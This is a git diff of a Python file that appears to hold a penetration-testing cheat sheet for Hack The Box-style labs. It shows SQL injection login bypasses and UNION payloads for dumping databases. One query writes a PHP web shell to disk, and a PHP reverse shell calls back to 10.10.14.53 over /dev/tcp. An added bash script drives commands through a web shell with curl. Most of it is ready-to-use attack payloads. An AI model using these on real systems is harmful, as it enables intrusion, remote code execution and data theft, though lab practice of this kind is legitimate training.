@@ -665,9 +665,7 @@ wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.tx
 
 mysqlBasicAndSqlInjection = Cheat("MySQL / SqlInjection")
 mysqlBasicAndSqlInjection.category = "Tools"
-mysqlBasicAndSqlInjection.output = """[*] 
-
-[*] Command                                                      # Description
+mysqlBasicAndSqlInjection.output = """[*] Command                                                      # Description
 [*] General
 mysql -u root -h docker.hackthebox.eu -P 3306 -p                 # login to mysql database
 
@@ -715,6 +713,7 @@ SELECT * FROM logins WHERE username LIKE 'admin%'   # List results where the nam
 # Auth Bypass
 admin' or '1'='1                                   # Basic Auth Bypass
 admin')-- -                                        # Basic Auth Bypass With comments
+
 [*] Union Injection
 ' order by 1-- -                                   # Detect number of columns using `order by`
 cn' UNION select 1,2,3-- -                         # Detect number of columns using Union injection
@@ -725,8 +724,9 @@ UNION select username, 2, 3, 4 from passwords-- -  # Union injection for 4 colum
 SELECT @@version                                   # Fingerprint MySQL with query output
 SELECT SLEEP(5)                                    # Fingerprint MySQL with no output
 cn' UNION select 1,database(),2,3-- -              # Current database name
+
 # List all databases
-# cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+ cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
 # List all tables in a specific database
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
 # List all columns in a specific table
@@ -757,7 +757,7 @@ cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/
 ######################################
 
 fileTransfereLinux = Cheat("File Transfere Linux - nc / ftp")
-fileTransfereLinux.category = ""
+fileTransfereLinux.category = "Linux"
 fileTransfereLinux.output = """[*] File Transfere Techniques With nc - Linux
 
 nc -nlvp 4646 > file.f     # receiver
@@ -788,4 +788,32 @@ webShell.output = """[*] Web Shell em PHP
 
 # Or...
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.53/443 0>&1'");?>
+"""
+
+######################################
+######################################
+
+fakeShell = Cheat("Fake Shell in bash for web shell with parameter and RCE - urlencoded")
+fakeShell.category = "Web"
+fakeShell.output = """[*] Script in bash to simule shell via webshell RCE
+
+#!/bin/bash
+
+function ctrl_c() {
+	echo -e "\n[!]Saindo...\n"
+	exit 1
+}
+# Ctrl+C
+trap ctrl_c INT
+
+declare -r mainUrl="http://sec03.rentahacker.htb/shell.php"
+declare -r paramName="hidden"
+
+while true; do
+	echo -n "[fakeShell ~] " && read -r command
+	echo
+	curl -s -X GET -G $mainUrl --data-urlencode "$paramName=$command"
+	echo
+done
+
 """
